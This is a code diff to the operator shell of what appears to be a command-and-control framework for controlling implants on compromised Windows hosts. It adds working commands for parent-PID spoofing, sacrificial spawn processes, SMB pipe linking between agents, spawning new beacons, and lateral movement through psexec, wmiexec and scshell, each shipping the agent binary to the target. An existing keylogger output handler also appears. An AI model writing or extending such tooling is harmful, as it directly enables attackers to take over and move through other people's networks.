@@ -439,6 +439,215 @@ class OperatorShell:
             console.print(f"[green]Task queued: cd {cd_path}[/green]")
             return
 
+        # spawnto — set sacrificial process for post-ex jobs
+        if cmd == "spawnto":
+            argstr = " ".join(args) if args else ""
+            self.task_manager.create_task(
+                agent, TaskType.NATIVE, "spawnto",
+                arguments=argstr.encode("utf-8") if argstr else b"",
+            )
+            if argstr:
+                console.print(f"[green]Task queued: spawnto {argstr}[/green]")
+            else:
+                console.print("[green]Task queued: spawnto (show current config)[/green]")
+            return
+
+        # ppid — set parent PID for spawned processes
+        if cmd == "ppid":
+            argstr = args[0] if args else ""
+            self.task_manager.create_task(
+                agent, TaskType.NATIVE, "ppid",
+                arguments=argstr.encode("utf-8") if argstr else b"",
+            )
+            if argstr:
+                console.print(f"[green]Task queued: ppid {argstr}[/green]")
+            else:
+                console.print("[green]Task queued: ppid (show current)[/green]")
+            return
+
+        # link — connect to child agent's SMB pipe
+        if cmd == "link":
+            if len(args) < 2:
+                console.print(
+                    "[red]Usage: link <target> <pipename>[/red]\n"
+                    "[dim]  Example: link DUB-SQL-1 TSVCPIPE-4b2f70b3-ceba-42a5[/dim]"
+                )
+                return
+
+            target, pipename = args[0], args[1]
+
+            import struct
+            host_bytes = target.encode("utf-8") + b"\x00"
+            pipe_bytes = pipename.encode("utf-8") + b"\x00"
+            packed = struct.pack("<I", len(host_bytes)) + host_bytes
+            packed += struct.pack("<I", len(pipe_bytes)) + pipe_bytes
+
+            self.task_manager.create_task(
+                agent, TaskType.NATIVE, "link",
+                arguments=packed,
+            )
+            self.logger.log_command(
+                agent.agent_id, agent.hostname, agent.username,
+                "link", {"target": target, "pipename": pipename},
+            )
+            console.print(
+                f"[green]Task queued: link {target} via \\\\{target}\\pipe\\{pipename}[/green]"
+            )
+            return
+
+        # unlink — disconnect linked child agent
+        if cmd == "unlink":
+            target_str = args[0] if args else ""
+            self.task_manager.create_task(
+                agent, TaskType.NATIVE, "unlink",
+                arguments=target_str.encode("utf-8") if target_str else b"",
+            )
+            if target_str:
+                console.print(f"[green]Task queued: unlink {target_str}[/green]")
+            else:
+                console.print("[green]Task queued: unlink (list active links)[/green]")
+            return
+
+        # spawn — fork sacrificial process as new beacon
+        if cmd == "spawn":
+            if not args:
+                console.print(
+                    "[red]Usage: spawn <listener>[/red]\n"
+                    "[dim]  Spawns a new beacon using the current spawnto/ppid config.[/dim]\n"
+                    "[dim]  Tip: set spawnto/ppid before spawning.[/dim]"
+                )
+                return
+
+            listener_name = args[0]
+
+            # Validate listener
+            found_listener = None
+            for lid, lst in self._listeners.items():
+                info = lst.info()
+                if (info["type"].upper() == listener_name.upper()
+                        or str(info["id"]) == listener_name):
+                    found_listener = lst
+                    break
+            if not found_listener:
+                console.print(f"[red]Listener '{listener_name}' not found.[/red]")
+                console.print("[dim]  Use 'listeners' to see available listeners.[/dim]")
+                return
+            if not found_listener.running:
+                console.print(f"[red]Listener '{listener_name}' is not running.[/red]")
+                return
+
+            # Use the current agent's arch for the payload
+            arch = agent.arch  # "x64" or "x86"
+            project_root = Path(__file__).resolve().parent.parent.parent
+            builds_dir = project_root / "builds"
+            agent_binary = builds_dir / f"agent_{arch}.exe"
+            if not agent_binary.exists():
+                console.print(
+                    f"[red]Agent binary not found: {agent_binary}[/red]\n"
+                    f"[dim]  Run 'generate --arch {arch}' first.[/dim]"
+                )
+                return
+
+            payload = agent_binary.read_bytes()
+            payload_size_kb = len(payload) / 1024
+
+            # Pack wire format: [4B payload_len][payload]
+            import struct
+            packed = struct.pack("<I", len(payload))
+            packed += payload
+
+            self.task_manager.create_task(
+                agent, TaskType.NATIVE, "spawn",
+                arguments=packed,
+            )
+            self.logger.log_command(
+                agent.agent_id, agent.hostname, agent.username,
+                "spawn", {"listener": listener_name, "arch": arch},
+            )
+            console.print(
+                f"[green]Task queued: spawn {listener_name} "
+                f"({arch}, {payload_size_kb:.1f} KB payload)[/green]"
+            )
+            return
+
+        # jump — lateral movement
+        if cmd == "jump":
+            if len(args) < 3:
+                console.print(
+                    "[red]Usage: jump <method> <target> <listener>[/red]\n"
+                    "[dim]  Methods: psexec64 psexec32 wmiexec64 wmiexec32 scshell64 scshell32[/dim]"
+                )
+                return
+
+            method_str, target, listener_name = args[0].lower(), args[1], args[2]
+
+            JUMP_METHODS = {
+                "psexec64": (0, "x64"), "psexec32": (0, "x86"),
+                "wmiexec64": (1, "x64"), "wmiexec32": (1, "x86"),
+                "scshell64": (2, "x64"), "scshell32": (2, "x86"),
+            }
+            if method_str not in JUMP_METHODS:
+                console.print(f"[red]Unknown method: {method_str}[/red]")
+                console.print("[dim]  Valid: psexec64 psexec32 wmiexec64 wmiexec32 scshell64 scshell32[/dim]")
+                return
+
+            method_id, arch = JUMP_METHODS[method_str]
+
+            # Validate listener exists and is running
+            found_listener = None
+            for lid, lst in self._listeners.items():
+                info = lst.info()
+                # Match by type name (case-insensitive) or by listener ID
+                if (info["type"].upper() == listener_name.upper()
+                        or str(info["id"]) == listener_name):
+                    found_listener = lst
+                    break
+            if not found_listener:
+                console.print(f"[red]Listener '{listener_name}' not found.[/red]")
+                console.print("[dim]  Use 'listeners' to see available listeners.[/dim]")
+                return
+            if not found_listener.running:
+                console.print(f"[red]Listener '{listener_name}' is not running.[/red]")
+                return
+
+            # Find agent binary for this listener/arch
+            project_root = Path(__file__).resolve().parent.parent.parent
+            builds_dir = project_root / "builds"
+            # Look for: agent_x64.exe or agent_x86.exe
+            agent_binary = builds_dir / f"agent_{arch}.exe"
+            if not agent_binary.exists():
+                console.print(
+                    f"[red]Agent binary not found: {agent_binary}[/red]\n"
+                    f"[dim]  Run 'generate --arch {arch}' first.[/dim]"
+                )
+                return
+
+            payload = agent_binary.read_bytes()
+            payload_size_kb = len(payload) / 1024
+
+            # Pack wire format: [1B method][4B target_len][target][4B payload_len][payload]
+            import struct
+            target_bytes = target.encode("utf-8") + b"\x00"
+            packed = struct.pack("<B", method_id)
+            packed += struct.pack("<I", len(target_bytes))
+            packed += target_bytes
+            packed += struct.pack("<I", len(payload))
+            packed += payload
+
+            self.task_manager.create_task(
+                agent, TaskType.NATIVE, "jump",
+                arguments=packed,
+            )
+            self.logger.log_command(
+                agent.agent_id, agent.hostname, agent.username,
+                "jump", {"method": method_str, "target": target, "listener": listener_name},
+            )
+            console.print(
+                f"[green]Task queued: jump {method_str} {target} {listener_name} "
+                f"({payload_size_kb:.1f} KB payload)[/green]"
+            )
+            return
+
         # dir — sends "ls" to agent, formatted as CMD dir output
         if cmd == "dir":
             dir_path = " ".join(args) if args else ""
@@ -907,6 +1116,14 @@ def _fmt_keylogger(text: str):
     _print("")
 
 
+def _fmt_jump(text: str):
+    """Print jump (lateral movement) output."""
+    _print("")
+    for line in text.strip().splitlines():
+        _print(f"  {line}")
+    _print("")
+
+
 _NATIVE_FORMATTERS = {
     "systeminfo": _fmt_systeminfo,
     "whoami": _fmt_whoami,
@@ -914,4 +1131,10 @@ _NATIVE_FORMATTERS = {
     "ls": _fmt_ls,
     "dir": _fmt_dir,
     "keylogger": _fmt_keylogger,
+    "jump": _fmt_jump,
+    "link": _fmt_jump,
+    "unlink": _fmt_jump,
+    "spawnto": _fmt_jump,
+    "ppid": _fmt_jump,
+    "spawn": _fmt_jump,
 }
